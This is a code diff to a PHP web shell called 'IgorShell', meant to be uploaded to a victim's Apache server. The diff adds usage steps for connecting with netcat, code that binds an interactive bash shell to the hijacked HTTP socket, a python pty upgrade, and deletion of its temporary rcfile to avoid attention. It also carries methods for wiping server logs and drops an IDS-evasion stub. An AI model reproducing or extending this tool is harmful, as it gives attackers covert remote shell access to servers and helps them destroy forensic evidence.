@@ -5,9 +5,16 @@
  *    Author: Captain, Mantis
  *    Date: 05-08-2013
  *    Dependencies: PHP >= 5.3.6
+ *    USAGE: 
+ *      1: upload to apache server running php >= 5.3.6
+ *      2: nc -v [target hostname] 80
+ *          GET /fd.php HTTP/1.0
+ *
+ *      [shell magically spawns]
+ *      $SINIT (<-- optional in case you want a pretty shell)
  */
 
-// Disable timing out as we wish to facilitate a statefull shell session.
+// Disable timing out as we wish to facilitate a stateful shell session.
 set_time_limit(0);
 
 // TODO: Set debug info to false when releasing to production.
@@ -16,7 +23,7 @@ ini_set('display_errors', true);
 
 class IgorShell {
 
-    private $m_Shell = '/bin/sh';
+    private $m_Shell = '/bin/bash';
 
     private $m_Pid,
             $m_Nice,
@@ -68,11 +75,8 @@ class IgorShell {
     private function getFileDescriptors(  ) {
 
         $it = new DirectoryIterator("glob:///proc/self/fd/*");
-        /**
-         //
-         // -- This code is here because I need to finish writing an implementation for non-linux operating systems
-         //
-         */
+       
+        // -- This code is here because I need to finish writing an implementation for non-linux operating systems
         // $x = `lsof`;
         // $return = array();
         // if($b = preg_split('/(\t|\s)+/', $x)){
@@ -119,6 +123,9 @@ class IgorShell {
         echo "<hr/>".print_r($this->m_FileDescriptors, true).'<br/>';
     }
 
+    /**
+     *  Method that erases contents of a log file we have inherited a file descriptor too
+     */
     public function wipeLog( $fd = null ) {
 
         // Default fd for log. If NULL ,retrieve logfiles from internal file descripters.
@@ -154,6 +161,9 @@ class IgorShell {
         }
     }
 
+    /**
+     *  Method for fetching inherited file descriptors that point to log files
+     */
     private function getLogFiles(){
         if(empty($this->m_FileDescriptors)){
             $this->getFileDescriptors();
@@ -176,11 +186,14 @@ class IgorShell {
      *    @todo : Finish this function
      */
     private function editLog( $fd = null ) {
+
         $this->m_TimeEnd = time();
         $timeStart = date('M  d', $this->m_TimeStart);
 
         $logFileName = ''; // Filename?
+       
         $fh = @fopen($logFileName, 'r+');
+       
         if(!$fh){
             return false;
         }
@@ -205,8 +218,8 @@ class IgorShell {
     }
 
     /**
-     *    Findsock method iterates over socket descriptors found
-     *    untill it's found the requesting socket.
+     *    Findsock iterates over socket descriptors found
+     *    untill the requesting socket is found.
      */
     public function findSock() {
         if(!$this->m_FileDescriptors){
@@ -221,7 +234,7 @@ class IgorShell {
                 }
 
                 $remote = stream_socket_get_name($d['fd'], true);
-                if( $remote == $this->m_BossIp . ':' . $this->m_BossPort) {
+                if( strstr($remote, $this->m_BossIp . ':' . $this->m_BossPort) ) {
 
                     // Sock found!
                     $this->m_BossSock = $d['fd'];
@@ -236,231 +249,107 @@ class IgorShell {
         }
     }
 
-    public function hookShell($socketResource = null) {
+    /**
+     *  Awesome banner ASCII art
+     */
+    public function getBanner() {
+
+        return '
+   ____                ______       ____       ___   ___  ___        ____       
+  /  _/__ ____  ____  / __/ /  ___ / / / _  __/ _ \ <  / / _ | ___  / / /  ___ _
+ _/ // _ `/ _ \/ __/ _\ \/ _ \/ -_) / / | |/ / // / / / / __ |/ _ \/ / _ \/ _ `/
+/___/\_, /\___/_/   /___/_//_/\__/_/_/  |___/\___(_)_/ /_/ |_/ .__/_/_//_/\_,_/ 
+    /___/                                                   /_/                 
+
+            >>>> Run $SINIT to enable bash color output
+
+    ';
+    }
+
+
+    /**
+     *  
+     *
+     */
+    public function hookShell($sock = null) {
 
         // Check if sock has been found
         if( !is_resource($this->m_BossSock) ){
+            echo 'BossSock is not resource, looking for socket.';
             $this->findSock();
         }
 
-        // Disable blocking for socket stream
-        socket_set_nonblock($this->m_BossSock);
+        $sock = $this->m_BossSock;
 
-        // Close control pipes
-        $p1 = fopen('php://fd/4', 'w');
-        $p2 = fopen('php://fd/5', 'w');
-        ftruncate($p1, 0);
-        ftruncate($p2, 0);
-        fclose($p2);
-        fclose($p1);
+        // Disable blocking for socket stream
+        socket_set_nonblock($sock);
 
         // Prepare io pipes
         $io = array(
-                0 => $this->m_BossSock,
-                1 => $this->m_BossSock,
-                2 => $this->m_BossSock
+                0 => $sock,
+                1 => $sock,
+                2 => $sock
             );
 
+        // Write temporary rcfile
+        $tmpfile = tmpfile();
+        fwrite($tmpfile, 'eval $COLLECTD');
+        $meta_data = stream_get_meta_data($tmpfile);
+        $rcfile = $meta_data["uri"];
+
+        // Prepare env. variables
+        $env = array(   'PS1'           =>'\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]$', 
+                        'TERM'          =>'xterm-color',
+                        'GREP_OPTIONS'  =>'--color=auto',
+                        'GREP_COLOR'    =>'1;32',
+                        'CLICOLOR'      =>'1',
+                        'LSCOLORS'      =>'ExFxCxDxBxegedabagacad',
+                        'COLLECTD'      =>"python -c 'import pty; pty.spawn(\"/bin/bash\")'",           // Spawn pty shell using python giving us more capabilities (ie. su, less, etc.) TODO: Check if python is installed
+                        'SINIT'       =>'source /etc/skel/.bashrc && source /etc/skel/.profile',
+                    );
+
+
         // Set process as leading session.
-        posix_setsid ();
+        posix_setsid();
+
+        // Write Banner to socket before spawning shell
+        fwrite($sock, $this->getBanner());
 
         // Spawn shell process and attach pipes
-        $proc = proc_open(  $this->m_Shell,
+        // TODO: place bash args in $this->m_Shell with placeholder for rcfile. 
+        $proc = proc_open(  $this->m_Shell . ' --rcfile ' . $rcfile . ' -i',
                             $io,
-                            $pipes
+                            $pipes,
+                            NULL,
+                            $env
                         );
 
         // Check if process spawned successfully
         if( !is_resource($proc) )
             die('Failed to spawn shell process');
 
+        // Wait for one second and delete temporary rcfile to avoid attention
+        sleep(1);
+        fclose($tmpfile);
+
         // Main loop
-        while( is_resource($this->m_BossSock) ) {
+        while( is_resource($sock) ) {
 
             // Fetch proc and sock states
             $procState = proc_get_status($proc);
 
             // Check if either one is dead
-            if( $procState['running'] === false ) {
-
-                // Clean up
-                fflush($this->m_BossSock);
-                fclose($this->m_BossSock);
-                proc_close($proc);
+            if( $procState['running'] === false  ) {
+                break;
             }
 
             sleep(1000);
         }
-    }
-    /**
-     * @todo : finish off this function
-     */
-    public function evadeIDS($arg, $count = false){
-        switch(strtolower(gettype($arg))){
-            case 'string':
-                $strlen = strlen($arg);
-                // 255 - strlen to ensure it will work on most/all varchar fields
-                $arg = $this->randCode(rand(0, (255-$strlen)));
-                break;
 
-            case 'boolean':
-            case 'integer':
-            default:
-                $arg = rand(1, 32);
-                break;
-        }
-        return $arg;
-    }
-
-    public function getRemoteFile($host, $directory, $filename, &$errstr, &$errno, $port=80, $timeout=10) {
-        $fsock = fsockopen($host, $port, $errno, $errstr, $timeout);
-        if($fsock) {
-            @fputs($fsock, 'GET '.$directory.'/'.$filename.' HTTP/1.1'."\r\n");
-            @fputs($fsock, 'HOST: '.$host."\r\n");
-            @fputs($fsock, 'Connection: close'."\r\n\r\n");
-
-            $file_info = '';
-            $get_info = false;
-
-            while(!feof($fsock)) {
-                if($get_info) {
-                    $file_info .= fread($fsock, 1024);
-                } else {
-                    $line = fgets($fsock, 1024);
-                    if($line == "\r\n") {
-                        $get_info = true;
-                    } else {
-                        if(stripos($line, '404 not found') !== false) {
-                            $errstr = 'Error 404: '.$filename;
-                            return false;
-                        }
-                    }
-                }
-            }
-            fclose($fsock);
-        } else {
-            if($errstr) {
-                return false;
-            } else {
-                $errstr = 'fsockopen is disabled.';
-                return false;
-            }
-        }
-
-        return $file_info;
-    }
-
-    protected function strnstr($haystack, $needle, $nth){
-        $max = strlen($haystack);
-        $n = 0;
-        for( $i=0; $i < $max; $i++ ){
-            if( $haystack[$i] == $needle ){
-                $n++;
-                if( $n >= $nth ){
-                    break;
-                }
-            }
-        }
-        $arr[] = substr($haystack, 0, $i);
-
-        return $arr[0];
-    }
-
-    protected function randCode($maxLength=6){
-        $password = NULL;
-        $possible = 'bcdfghjkmnrstvwxyz123456789';
-        $i = 0;
-        while(($i < $maxLength) && (strlen($possible) > 0)){
-            $i++;
-            $character = substr($possible, mt_rand(0, strlen($possible)-1), 1);
-            $password .= $character;
-        }
-        return $password;
-    }
-
-    protected function memoryUsage($info = null, $nl = '<br />') {
-        static $start_code_line = 0;
-        static $memoryUsage = array();
-
-        $start_time = time();
-
-        $debug     = debug_backtrace();
-        $call_info = array_shift($debug);
-        $code_line = $call_info['line'];
-        $file      = explode((stristr(PHP_OS, 'WIN') ? '\\' : '/'), $call_info['file']);
-        $file      = array_pop($file);
-
-        if ($start_time === null) {
-            print 'debug ['.($info === null ? null : $info).']<strong>'.$file.'</strong>> init'.$nl;
-            $start_time = time() + microtime();
-            $start_code_line = $code_line;
-            return 0;
-        }
-
-        $memoryUsage[] = array(
-            'info'        => ($info === null ? null : $info),
-            'file_exec'   => $file,
-            'start_exec'  => $start_code_line,
-            'end_exec'    => $code_line,
-            'time_exec'   => round(time() + microtime() - $start_time, 4),
-            'memory_exec' => memory_get_usage()
-        );
-
-        $start_time = time() + microtime();
-        $start_code_line = $code_line;
-
-        return $memoryUsage;
-    }
-    /**
-     * Verifies an IP against a IPv4 range.
-     *         127.0.0.1 would verify against 127.0.0.* but not *.*.*.2
-     */
-    public function checkIPRange($range, $ip){
-        $range = explode('.', $range);
-        $ip = explode('.', $ip);
-
-        // Make sure the IP is valid under IPv4
-        if(count($range) > 4 || count($ip) > 4){
-            return false;
-        }
-
-        if($range[0] == '*' || $ip[0] == '*'){
-            return false;
-        }
-
-        for($i=0;$i<4;$i++){
-            // Make sure the SubMask is valid under IPv4
-            if(strlen($range[$i]) > 3 || strlen($ip[$i]) > 3){
-                return false;
-            }
-
-            // Make sure the SubMask is valid
-            if(!is_number($range[$i]) && $range[$i] != '*'){
-                return false;
-            }
-
-            // Make sure the SubMask is valid
-            if(!is_number($ip[$i]) && $ip[$i] != '*'){
-                return false;
-            }
-
-            // Make sure the SubMask is valid
-            if(is_number($range[$i]) && strlen($range[$i]) > 255){
-                return false;
-            }
-
-            // Make sure the SubMask is valid
-            if(is_number($ip[$i]) && strlen($ip[$i]) > 255){
-                return false;
-            }
-
-            // Final Check
-            if($range[$i] != $ip[$i] && $range[$i] != '*'){
-                return false;
-            }
-        }
-
-        return true;
+        // Clean up
+        fflush($sock);
+        fclose($sock);
+        proc_close($proc);
     }
 }
 
